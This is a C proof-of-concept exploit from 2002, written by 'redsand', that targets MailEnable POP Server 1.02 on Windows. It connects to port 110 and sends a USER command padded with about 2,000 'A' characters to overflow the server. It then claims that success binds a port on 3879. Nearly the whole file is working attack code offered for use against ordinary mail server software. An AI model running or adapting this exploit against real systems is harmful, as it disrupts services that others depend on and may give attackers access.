/*
*
* Written by redsand
* <redsand@redsand.net>
* Vuln. date found: November 18. 2002
* Vulnerable: Windows 9x/NT/XP MailEnable POP Server Version 1.02
*
* Usage: ./mailenable-dos.1.3 <host> [port] [port] is optional. default is in the #define (port 110)
* Need to Enable [offset] in final release.
*
* Proof of Concept code (PoC)
*
*/


#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>

#define PORT 110

char string[2010];
char death[2500];
char top[5], end[50];
char tag[] = "::redsand.net::";

int main(int argc, char *argv[]) {

  int sockfd, port, i;
  char buf[2500];
  struct hostent *ha;
  struct sockaddr_in sa;
  if (argc < 2 ) {
printf("MailEnable POP Server Version 1.02 DoS\n:: redsand <at> redsand.net\r\nUsage: %s <host> <port>\n", argv[0]);
    exit(0);
  }
if (argv[2]) {
port = atoi(argv[2]);
} else { port = PORT; }
for( i = 0; i <2009; i++) {
string[i] = 'A';
}

strcpy(top,"USER ");
strcpy(end,tag);
strcpy(death,top);
strcat(death,string);
strcat(death,end);

  if (!(ha = gethostbyname (argv[1])))
    perror ("gethostbyname");

  bzero (&sa, sizeof (sa));
  bcopy (ha->h_addr, (char *) &sa.sin_addr, ha->h_length);
  sa.sin_family = ha->h_addrtype;
  sa.sin_port = htons (port);

  if ((sockfd = socket (ha->h_addrtype, SOCK_STREAM, 0)) < 0) {
    perror ("socket");
    exit (1);
  }
 printf("MailEnable :: redsand <at> redsand.net\r\n+ connecting...\n");
  if (connect (sockfd, (struct sockaddr *) &sa, sizeof(sa)) < 0) {
    perror ("connect");
    exit (1);
  }
  printf("+ connected\n+ sending request to pop3 server\n");
  send(sockfd, death, sizeof(death), 0);
  // read(sockfd, buf, 2050, 0);
    close(sockfd);
  printf("+ finished\n");
  printf("\r\rIf exploit worked, then it should bind port on 3879\n");
}

/* redsand.net */
